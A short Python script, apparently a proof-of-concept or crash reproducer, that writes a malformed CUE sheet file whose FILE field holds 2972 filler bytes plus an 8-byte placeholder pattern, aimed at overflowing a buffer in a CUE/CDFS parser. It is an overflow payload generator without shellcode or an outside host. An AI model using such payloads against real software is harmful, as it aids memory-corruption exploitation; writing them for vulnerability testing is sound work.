#!/usr/bin/env python3
import struct

# Simple payload with just As
payload = b"A" * 2972
payload += struct.pack("<Q", 0x4142434445464748)  # Test pattern

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
